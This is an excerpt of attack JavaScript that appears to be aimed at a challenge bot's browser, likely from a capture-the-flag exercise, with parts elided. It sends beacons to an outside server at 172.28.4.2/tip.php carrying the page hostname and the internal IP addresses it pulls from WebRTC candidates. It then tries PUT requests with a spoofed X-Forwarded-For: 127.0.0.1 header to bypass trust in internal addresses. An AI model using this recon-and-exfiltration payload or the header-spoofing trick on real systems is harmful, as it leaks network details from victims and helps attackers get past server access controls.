(async () => {
  ...
  const bc = async (key) => {
    ...
    try {
      await fetch('http://172.28.4.2/tip.php', {method:'POST', body:fd, mode:'no-cors'});
    } catch(e) {}
  };

  await bc('A');
  await bc('HOST_' + window.location.hostname.replace(/\./g,'_').substring(0,15));

  // Detect local IP via WebRTC (to confirm bot is in 10.96.3.x range)
  try {
    ...
    const sdp = rtc.localDescription ? rtc.localDescription.sdp : '';
    const ipMatch = sdp.match(/a=candidate:[^\r\n]+/g);
    if (ipMatch) {
      for (const m of ipMatch) {
        const ip = m.match(/(\d+\.\d+\.\d+\.\d+)/);
        if (ip) await bc('IP_' + ip[1].replace(/\./g,'_'));
      }
    }
    rtc.close();
  } catch(e) {
...
<body>
  ...
  // Strategy 1: PUT directly from bot context with X-Forwarded-For: 127.0.0.1
  // If nginx trusts internal IPs, PHP will see REMOTE_ADDR=127.0.0.1
  let s1 = 'ERR';
  try {
    ...
    s1 = 'S1_' + r.status + (t.includes('CT-CASE') ? '_CT' : '_NO');
  } catch(e) {
    s1 = 'S1_ERR';
  }
  await bc(s1);

  // Strategy 2: PUT with raw HTML body (not JSON-wrapped)
  let s2 = 'ERR';
  try {
    ...
    s2 = 'S2_' + r2.status + (t2.includes('CT-CASE') ? '_CT' : '_NO');
  } catch(e) {
    s2 = 'S2_ERR';
  }
  await bc(s2);
  ...
  // Check homepage
  try {
    const hr = await fetch('/', {cache:'no-store'});
